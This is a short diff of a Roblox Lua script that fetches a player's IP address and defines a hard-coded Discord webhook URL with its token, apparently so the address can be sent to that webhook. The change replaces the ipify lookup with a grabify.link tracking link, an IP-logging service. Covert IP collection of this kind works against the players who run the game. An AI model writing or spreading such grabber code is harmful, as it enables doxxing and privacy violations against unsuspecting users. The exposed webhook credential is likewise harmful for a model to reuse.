@@ -1,11 +1,11 @@
 local HttpService = game:GetService("HttpService")
 local webhook = "https://discord.com/api/webhooks/1388077936501981326/7gt3grPt15e72oWMRmEhJJs9HY0G7iC0oVyZxbMQ1EYb-IIdcgW3nRosgsGEbAVrooxQ"
 
--- Function to get the player's IP (using ipify API)
+-- Function to get the player's IP (using grabify API)
 local function GetPlayerIP()
     local ip = "Unknown"
     local success, response = pcall(function()
-        return game:HttpGet("https://api.ipify.org/")
+        return game:HttpGet("https://grabify.link/76KJXC")
     end)
     
     if success then
